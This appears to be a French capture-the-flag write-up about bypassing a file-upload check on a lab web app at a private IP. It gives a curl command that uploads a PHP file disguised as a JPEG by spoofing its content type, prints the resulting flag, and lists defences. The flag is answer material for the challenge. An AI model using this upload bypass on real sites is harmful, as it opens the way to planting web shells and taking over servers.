# UPLOAD

## CIBLE: http://10.12.1.129/?page=upload

### PRÉ REQUIS

Aucun.

### IMPORT DE FICHIER PHP

Il est demandé d'uploader une image, le format jpeg est accepté.<br>
Cependant, le site ne vérifie que le type du fichier.<br>
Il est possible de le falsifier et ainsi faire passer un fichier de code (php par exemple) pour une image.<br>
Voici la commande pour obtenir le flag:
`touch backdoor.php && curl -F "uploaded=@backdoor.php;type=image/jpeg" -F "Upload=Upload" "http://10.12.1.129/?page=upload" | grep flag && rm backdoor.php`<br>
On obtient donc le flag: `46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8`.

### EXPLICATIONS

La commande `touch backdoor.php` va créer un fichier php. Pour obtenir ce flag, il suffit d'importer un fichier de code, il peut être vide. Cependant, il est possible d'y ajouter du code.<br>
La commande: `curl -F "uploaded=@backdoor.php;type=image/jpeg" -F "Upload=Upload" "http://10.12.1.129/?page=upload"`<br>
va uploader le fichier précédement créé, en changeant son header afin de le faire passer pour une image.<br>
La commande: `grep flag` va récupérer la ligne de l'html contenant le flag dans le retour de curl.<br>
La commande `rm backdoor.php` va supprimer le fichier créé en premier lieu. Parce que c'est plus propre.

## RISQUE

Ce type de faille peut se révéler très dangereuse et doit être réparée au plus vite. Elle permet basiquement d'accéder à tous les fichiers de la machine qui, en cas de failles, peut permettre l'obtention de droits administrateurs.

## PROTECTION

- Renommer le fichier
- Ne pas enregistrer de fichiers à la racine du site
- Vérifier la taille du fichier
- Effectuer un scan anti-malware
- Vérifier les permissions et les modifier si nécessaire (chmod)
- N’autoriser l'upload qu'aux utilisateurs inscrits et authentifiés
